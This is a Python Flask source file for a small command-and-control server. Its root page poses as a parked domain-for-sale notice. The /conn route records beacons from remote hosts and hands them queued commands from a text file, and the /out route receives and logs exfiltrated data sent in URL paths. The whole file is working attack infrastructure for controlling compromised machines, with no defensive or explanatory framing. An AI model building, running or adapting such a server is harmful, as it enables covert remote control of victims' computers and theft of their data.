from flask import Flask
app = Flask(__name__)


@app.route('/')
def root_dir():
    return_string = "Domain available for puchase <br \> <br \> Email     'administrator@nonewideas.com'     for more info"

    return return_string


@app.route('/conn/<hostname>/<username>')
@app.route('/conn/<hostname>/<username>/')
def new_connection(hostname, username):
    cmd_file = open('command.txt')
    log_file = open("logs/" + hostname + ".txt", 'a')
    command = cmd_file.readline()

    print('[+] Beacon from: ', hostname, ' as ', username)
    log_file.writelines('[+] Beacon from: ' + hostname + ' as ' + username + '\n')

    if command != '':
        print('[+] Command sent: ', command)
        log_file.writelines('[+] Command sent: ' + command + '\n')
    else:
        pass

    cmd_file.close()
    log_file.close()

    return command


@app.route('/out/<hostname>/<exfil>')
@app.route('/out/<hostname>/<exfil>/')
def exfil_data(hostname, exfil):
    log_file = open("logs/" + hostname + ".txt", 'a')
    return_string = ''

    print('[i] Response from ', hostname, ": ", exfil)
    log_file.writelines('[i] Response from ' + hostname + ": " + exfil + '\n')

    log_file.close()

    return return_string


def start_server():
    app.run(host = '0.0.0.0', debug=False, port=80)


if __name__ == '__main__':
    app.run(host = '0.0.0.0', debug=True, port=80)